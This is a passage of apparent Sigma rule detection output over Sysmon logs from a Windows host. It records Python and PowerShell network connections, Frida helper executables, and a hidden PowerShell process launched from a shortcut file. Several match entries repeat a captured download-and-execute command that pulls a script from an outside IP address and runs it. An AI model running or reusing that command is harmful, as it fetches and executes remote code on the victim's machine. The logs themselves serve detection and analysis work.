                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "Usermode",
                                                                                             "DestinationPort":  "443",
                                                                                             "User":  "work\\admin",
                                                                                             "Protocol":  "tcp",
                                                                                             "SourceIp":  "192.168.122.246",
                                                                                             "DestinationIsIpv6":  "false",
                                                                                             "DestinationPortName":  "-",
                                                                                             "UtcTime":  "2022-06-30 17:18:47.823",
                                                                                             "SourceIsIpv6":  "false",
                                                                                             "SourceHostname":  "-",
                                                                                             "Initiated":  "true",
                                                                                             "SourcePortName":  "-",
                                                                                             "DestinationIp":  "142.250.98.153",
                                                                                             "Image":  "C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python37\\pythonw.exe",
                                                                                             "EventID":  "3",
                                                                                             "ProcessGuid":  "5240FBE6-DABD-62BD-3B00-000000002400",
                                                                                             "ProcessId":  "576",
                                                                                             "SourcePort":  "49178",
                                                                                             "DestinationHostname":  "-"
                                                                                         }
                                                                          },
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "Usermode",
                                                                                             "DestinationPort":  "443",
                                                                                             "User":  "work\\admin",
                                                                                             "Protocol":  "tcp",
                                                                                             "SourceIp":  "192.168.122.246",
                                                                                             "DestinationIsIpv6":  "false",
                                                                                             "DestinationPortName":  "-",
                                                                                             "UtcTime":  "2022-06-30 17:18:57.366",
                                                                                             "SourceIsIpv6":  "false",
                                                                                             "DestinationIp":  "142.250.98.153",
                                                                                             "SourceHostname":  "-",
                                                                                             "SourcePortName":  "-",
                                                                                             "Initiated":  "true",
                                                                                             "Image":  "C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python37\\pythonw.exe",
                                                                                             "EventID":  "3",
                                                                                             "ProcessGuid":  "5240FBE6-DABD-62BD-3B00-000000002400",
                                                                                             "ProcessId":  "576",
                                                                                             "SourcePort":  "49179",
                                                                                             "DestinationHostname":  "-"
                                                                                         }
                                                                          }
                                                                      ],
                                                    "rule_level":  "high",
                                                    "rule_id":  "e4d5f1be0673fa786cc8379c15338af08cdd11eed433bead9e801d6204d42a2d",
                                                    "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                    "rule_title":  "Python Initiated Connection",
                                                    "rule_description":  "Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation",
                                                    "rule_author":  "frack113"
                                                },
                                                {
                                                    "match_context":  [
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "CurrentDirectory":  "C:\\Users\\admin\\Downloads\\",
                                                                                             "LogonId":  "72473",
                                                                                             "OriginalFileName":  "PowerShell.EXE",
                                                                                             "UtcTime":  "2022-06-30 17:18:21.312",
                                                                                             "Description":  "Windows PowerShell",
                                                                                             "User":  "work\\admin",
                                                                                             "Hashes":  "MD5=A575A7610E5F003CC36DF39E07C4BA7D,SHA256=006CEF6EF6488721895D93E4CEF7FA0709C2692D74BDE1E22E2A8719B2A86218,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453",
                                                                                             "ParentImage":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                                                                             "IntegrityLevel":  "High",
                                                                                             "TerminalSessionId":  "1",
                                                                                             "Image":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                                                                             "ParentProcessId":  "2312",
                                                                                             "ParentProcessGuid":  "5240FBE6-DACE-62BD-9800-000000002400",
                                                                                             "Product":  "Microsoft Windows Operating System",
                                                                                             "LogonGuid":  "5240FBE6-DA52-62BD-191B-010000000000",
                                                                                             "EventID":  "1",
                                                                                             "ProcessGuid":  "5240FBE6-DADD-62BD-AD00-000000002400",
                                                                                             "CommandLine":  "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring(\u0027http://120.48.85.228:80/favicon\u0027))\"",
                                                                                             "ParentCommandLine":  "c:/windows/system32/WindowsPowerShell/v1.0/powershell.exe start-process ??:??????.lnk",
                                                                                             "ProcessId":  "2872",
                                                                                             "FileVersion":  "10.0.14409.1005 (rs1_srvoob.161208-1155)",
                                                                                             "Company":  "Microsoft Corporation"
                                                                                         }
                                                                          },
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "CurrentDirectory":  "C:\\Users\\admin\\Downloads\\",
                                                                                             "LogonId":  "72473",
                                                                                             "OriginalFileName":  "PowerShell.EXE",
                                                                                             "UtcTime":  "2022-06-30 17:18:21.312",
                                                                                             "Description":  "Windows PowerShell",
                                                                                             "User":  "work\\admin",
                                                                                             "Hashes":  "MD5=A575A7610E5F003CC36DF39E07C4BA7D,SHA256=006CEF6EF6488721895D93E4CEF7FA0709C2692D74BDE1E22E2A8719B2A86218,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453",
                                                                                             "ParentImage":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                                                                             "IntegrityLevel":  "High",
                                                                                             "TerminalSessionId":  "1",
                                                                                             "Image":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                                                                             "ParentProcessId":  "2312",
                                                                                             "ParentProcessGuid":  "5240FBE6-DACE-62BD-9800-000000002400",
                                                                                             "Product":  "Microsoft Windows Operating System",
                                                                                             "LogonGuid":  "5240FBE6-DA52-62BD-191B-010000000000",
                                                                                             "EventID":  "1",
                                                                                             "ProcessGuid":  "5240FBE6-DADD-62BD-AD00-000000002400",
                                                                                             "CommandLine":  "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring(\u0027http://120.48.85.228:80/favicon\u0027))\"",
                                                                                             "ParentCommandLine":  "c:/windows/system32/WindowsPowerShell/v1.0/powershell.exe start-process ??:??????.lnk",
                                                                                             "ProcessId":  "2872",
                                                                                             "FileVersion":  "10.0.14409.1005 (rs1_srvoob.161208-1155)",
                                                                                             "Company":  "Microsoft Corporation"
                                                                                         }
                                                                          }
                                                                      ],
                                                    "rule_level":  "high",
                                                    "rule_id":  "e88280a32f81c8575c3cb9b02910d867498fbf28ca75ca922ad991faa3a68879",
                                                    "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                    "rule_title":  "PowerShell Web Download and Execution",
                                                    "rule_description":  "Detects suspicious ways to download files or content using PowerShell",
                                                    "rule_author":  "Florian Roth"
                                                },
                                                {
                                                    "match_context":  [
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "CurrentDirectory":  "C:\\Users\\admin\\Downloads\\",
                                                                                             "LogonId":  "72473",
                                                                                             "OriginalFileName":  "PowerShell.EXE",
                                                                                             "UtcTime":  "2022-06-30 17:18:21.312",
                                                                                             "Description":  "Windows PowerShell",
                                                                                             "User":  "work\\admin",
                                                                                             "Hashes":  "MD5=A575A7610E5F003CC36DF39E07C4BA7D,SHA256=006CEF6EF6488721895D93E4CEF7FA0709C2692D74BDE1E22E2A8719B2A86218,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453",
                                                                                             "ParentImage":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                                                                             "IntegrityLevel":  "High",
                                                                                             "TerminalSessionId":  "1",
                                                                                             "Image":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                                                                             "ParentProcessId":  "2312",
                                                                                             "ParentProcessGuid":  "5240FBE6-DACE-62BD-9800-000000002400",
                                                                                             "Product":  "Microsoft Windows Operating System",
                                                                                             "LogonGuid":  "5240FBE6-DA52-62BD-191B-010000000000",
                                                                                             "EventID":  "1",
                                                                                             "ProcessGuid":  "5240FBE6-DADD-62BD-AD00-000000002400",
                                                                                             "CommandLine":  "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring(\u0027http://120.48.85.228:80/favicon\u0027))\"",
                                                                                             "ParentCommandLine":  "c:/windows/system32/WindowsPowerShell/v1.0/powershell.exe start-process ??:??????.lnk",
                                                                                             "ProcessId":  "2872",
                                                                                             "FileVersion":  "10.0.14409.1005 (rs1_srvoob.161208-1155)",
                                                                                             "Company":  "Microsoft Corporation"
                                                                                         }
                                                                          },
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "CurrentDirectory":  "C:\\Users\\admin\\Downloads\\",
                                                                                             "LogonId":  "72473",
                                                                                             "OriginalFileName":  "PowerShell.EXE",
                                                                                             "UtcTime":  "2022-06-30 17:18:21.312",
                                                                                             "Description":  "Windows PowerShell",
                                                                                             "User":  "work\\admin",
                                                                                             "Hashes":  "MD5=A575A7610E5F003CC36DF39E07C4BA7D,SHA256=006CEF6EF6488721895D93E4CEF7FA0709C2692D74BDE1E22E2A8719B2A86218,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453",
                                                                                             "ParentImage":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                                                                             "IntegrityLevel":  "High",
                                                                                             "TerminalSessionId":  "1",
                                                                                             "Image":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                                                                             "ParentProcessId":  "2312",
                                                                                             "ParentProcessGuid":  "5240FBE6-DACE-62BD-9800-000000002400",
                                                                                             "Product":  "Microsoft Windows Operating System",
                                                                                             "LogonGuid":  "5240FBE6-DA52-62BD-191B-010000000000",
                                                                                             "EventID":  "1",
                                                                                             "ProcessGuid":  "5240FBE6-DADD-62BD-AD00-000000002400",
                                                                                             "CommandLine":  "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring(\u0027http://120.48.85.228:80/favicon\u0027))\"",
                                                                                             "ParentCommandLine":  "c:/windows/system32/WindowsPowerShell/v1.0/powershell.exe start-process ??:??????.lnk",
                                                                                             "ProcessId":  "2872",
                                                                                             "FileVersion":  "10.0.14409.1005 (rs1_srvoob.161208-1155)",
                                                                                             "Company":  "Microsoft Corporation"
                                                                                         }
                                                                          }
                                                                      ],
                                                    "rule_level":  "medium",
                                                    "rule_id":  "dac677b84d14788387f1c92fd6733396974f070639fca6be1bbf50df44b426cf",
                                                    "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                    "rule_title":  "PowerShell Web Download",
                                                    "rule_description":  "Detects suspicious ways to download files or content using PowerShell",
                                                    "rule_author":  "Florian Roth"
                                                },
                                                {
                                                    "match_context":  [
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "CurrentDirectory":  "C:\\Users\\admin\\Downloads\\",
                                                                                             "LogonId":  "72473",
                                                                                             "OriginalFileName":  "PowerShell.EXE",
                                                                                             "UtcTime":  "2022-06-30 17:18:21.312",
                                                                                             "Description":  "Windows PowerShell",
                                                                                             "User":  "work\\admin",
                                                                                             "Hashes":  "MD5=A575A7610E5F003CC36DF39E07C4BA7D,SHA256=006CEF6EF6488721895D93E4CEF7FA0709C2692D74BDE1E22E2A8719B2A86218,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453",
                                                                                             "ParentImage":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                                                                             "IntegrityLevel":  "High",
                                                                                             "TerminalSessionId":  "1",
                                                                                             "Image":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                                                                             "ParentProcessId":  "2312",
                                                                                             "ParentProcessGuid":  "5240FBE6-DACE-62BD-9800-000000002400",
                                                                                             "Product":  "Microsoft Windows Operating System",
                                                                                             "LogonGuid":  "5240FBE6-DA52-62BD-191B-010000000000",
                                                                                             "EventID":  "1",
                                                                                             "ProcessGuid":  "5240FBE6-DADD-62BD-AD00-000000002400",
                                                                                             "CommandLine":  "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring(\u0027http://120.48.85.228:80/favicon\u0027))\"",
                                                                                             "ParentCommandLine":  "c:/windows/system32/WindowsPowerShell/v1.0/powershell.exe start-process ??:??????.lnk",
                                                                                             "ProcessId":  "2872",
                                                                                             "FileVersion":  "10.0.14409.1005 (rs1_srvoob.161208-1155)",
                                                                                             "Company":  "Microsoft Corporation"
                                                                                         }
                                                                          },
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "CurrentDirectory":  "C:\\Users\\admin\\Downloads\\",
                                                                                             "LogonId":  "72473",
                                                                                             "OriginalFileName":  "PowerShell.EXE",
                                                                                             "UtcTime":  "2022-06-30 17:18:21.312",
                                                                                             "Description":  "Windows PowerShell",
                                                                                             "User":  "work\\admin",
                                                                                             "Hashes":  "MD5=A575A7610E5F003CC36DF39E07C4BA7D,SHA256=006CEF6EF6488721895D93E4CEF7FA0709C2692D74BDE1E22E2A8719B2A86218,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453",
                                                                                             "ParentImage":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                                                                             "IntegrityLevel":  "High",
                                                                                             "TerminalSessionId":  "1",
                                                                                             "Image":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                                                                             "ParentProcessId":  "2312",
                                                                                             "ParentProcessGuid":  "5240FBE6-DACE-62BD-9800-000000002400",
                                                                                             "Product":  "Microsoft Windows Operating System",
                                                                                             "LogonGuid":  "5240FBE6-DA52-62BD-191B-010000000000",
                                                                                             "EventID":  "1",
                                                                                             "ProcessGuid":  "5240FBE6-DADD-62BD-AD00-000000002400",
                                                                                             "CommandLine":  "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring(\u0027http://120.48.85.228:80/favicon\u0027))\"",
                                                                                             "ParentCommandLine":  "c:/windows/system32/WindowsPowerShell/v1.0/powershell.exe start-process ??:??????.lnk",
                                                                                             "ProcessId":  "2872",
                                                                                             "FileVersion":  "10.0.14409.1005 (rs1_srvoob.161208-1155)",
                                                                                             "Company":  "Microsoft Corporation"
                                                                                         }
                                                                          }
                                                                      ],
                                                    "rule_level":  "medium",
                                                    "rule_id":  "f92451c8957e89bb4e61e68433faeb8d7c1461c3b90d06b3403c8f3d87c728b8",
                                                    "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                    "rule_title":  "Windows Suspicious Use Of Web Request in CommandLine",
                                                    "rule_description":  "Detects the use of various web request with commandline tools or Windows PowerShell command,methods (including aliases)",
                                                    "rule_author":  "James Pemberton / @4A616D6573"
                                                },
                                                {
                                                    "match_context":  [
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "EXE",
                                                                                             "CreationUtcTime":  "2022-06-30 17:18:07.921",
                                                                                             "UtcTime":  "2022-06-30 17:18:07.921",
                                                                                             "EventID":  "11",
                                                                                             "ProcessGuid":  "5240FBE6-DABD-62BD-3B00-000000002400",
                                                                                             "ProcessId":  "576",
                                                                                             "Image":  "C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python37\\pythonw.exe",
                                                                                             "TargetFilename":  "C:\\Users\\admin\\AppData\\Local\\Temp\\frida-671154f6d102890b0f25d7ebfaa457b6\\frida-winjector-helper-32.exe"
                                                                                         }
                                                                          },
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "EXE",
                                                                                             "CreationUtcTime":  "2022-06-30 17:18:08.968",
                                                                                             "UtcTime":  "2022-06-30 17:18:08.968",
                                                                                             "EventID":  "11",
                                                                                             "ProcessGuid":  "5240FBE6-DABD-62BD-3B00-000000002400",
                                                                                             "ProcessId":  "576",
                                                                                             "Image":  "C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python37\\pythonw.exe",
                                                                                             "TargetFilename":  "C:\\Users\\admin\\AppData\\Local\\Temp\\frida-671154f6d102890b0f25d7ebfaa457b6\\frida-winjector-helper-64.exe"
                                                                                         }
                                                                          },
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "EXE",
                                                                                             "CreationUtcTime":  "2022-06-30 17:18:07.921",
                                                                                             "UtcTime":  "2022-06-30 17:18:07.921",
                                                                                             "EventID":  "11",
                                                                                             "ProcessGuid":  "5240FBE6-DABD-62BD-3B00-000000002400",
                                                                                             "ProcessId":  "576",
                                                                                             "Image":  "C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python37\\pythonw.exe",
                                                                                             "TargetFilename":  "C:\\Users\\admin\\AppData\\Local\\Temp\\frida-671154f6d102890b0f25d7ebfaa457b6\\frida-winjector-helper-32.exe"
                                                                                         }
                                                                          },
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "EXE",
                                                                                             "CreationUtcTime":  "2022-06-30 17:18:08.968",
                                                                                             "UtcTime":  "2022-06-30 17:18:08.968",
                                                                                             "EventID":  "11",
                                                                                             "ProcessGuid":  "5240FBE6-DABD-62BD-3B00-000000002400",
                                                                                             "ProcessId":  "576",
                                                                                             "Image":  "C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python37\\pythonw.exe",
                                                                                             "TargetFilename":  "C:\\Users\\admin\\AppData\\Local\\Temp\\frida-671154f6d102890b0f25d7ebfaa457b6\\frida-winjector-helper-64.exe"
                                                                                         }
                                                                          }
                                                                      ],
                                                    "rule_level":  "low",
                                                    "rule_id":  "b5386a23355681c43cfbd2f2ccfe4b16ed45324d0d7b5583487a9f302ee1e427",
                                                    "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                    "rule_title":  "Creation of an Executable by an Executable",
                                                    "rule_description":  "Detects the creation of an executable by another executable",
                                                    "rule_author":  "frack113"
                                                },
                                                {
                                                    "match_context":  [
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "DestinationPort":  "80",
                                                                                             "User":  "work\\admin",
                                                                                             "Protocol":  "tcp",
                                                                                             "SourceIp":  "192.168.122.246",
                                                                                             "DestinationIsIpv6":  "false",
                                                                                             "DestinationPortName":  "-",
                                                                                             "UtcTime":  "2022-06-30 17:18:16.725",
                                                                                             "SourceIsIpv6":  "false",
                                                                                             "SourceHostname":  "-",
                                                                                             "Initiated":  "true",
                                                                                             "SourcePortName":  "-",
                                                                                             "DestinationIp":  "67.26.245.254",
                                                                                             "Image":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                                                                             "EventID":  "3",
                                                                                             "ProcessGuid":  "5240FBE6-DACE-62BD-9800-000000002400",
                                                                                             "ProcessId":  "2312",
                                                                                             "SourcePort":  "49167",
                                                                                             "DestinationHostname":  "-"
                                                                                         }
                                                                          },
                                                                          {
                                                                              "values":  {
                                                                                             "SourceIsIpv6":  "false",
                                                                                             "DestinationPort":  "80",
                                                                                             "User":  "work\\admin",
                                                                                             "Protocol":  "tcp",
                                                                                             "SourceIp":  "192.168.122.246",
                                                                                             "DestinationIsIpv6":  "false",
                                                                                             "DestinationPortName":  "-",
                                                                                             "UtcTime":  "2022-06-30 17:18:24.247",
                                                                                             "RuleName":  "-",
                                                                                             "SourceHostname":  "-",
                                                                                             "Initiated":  "true",
                                                                                             "SourcePortName":  "-",
                                                                                             "DestinationIp":  "120.48.85.228",
                                                                                             "Image":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                                                                             "EventID":  "3",
                                                                                             "ProcessGuid":  "5240FBE6-DADD-62BD-AD00-000000002400",
                                                                                             "ProcessId":  "2872",
                                                                                             "SourcePort":  "49173",
                                                                                             "DestinationHostname":  "-"
                                                                                         }
                                                                          },
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "DestinationPort":  "80",
                                                                                             "User":  "work\\admin",
                                                                                             "Protocol":  "tcp",
                                                                                             "SourceIp":  "192.168.122.246",
                                                                                             "DestinationIsIpv6":  "false",
                                                                                             "DestinationPortName":  "-",
                                                                                             "UtcTime":  "2022-06-30 17:18:16.725",
                                                                                             "SourceIsIpv6":  "false",
                                                                                             "Initiated":  "true",
                                                                                             "SourceHostname":  "-",
                                                                                             "SourcePortName":  "-",
                                                                                             "DestinationIp":  "67.26.245.254",
                                                                                             "Image":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                                                                             "EventID":  "3",
                                                                                             "ProcessGuid":  "5240FBE6-DACE-62BD-9800-000000002400",
                                                                                             "ProcessId":  "2312",
                                                                                             "SourcePort":  "49167",
                                                                                             "DestinationHostname":  "-"
                                                                                         }
                                                                          },
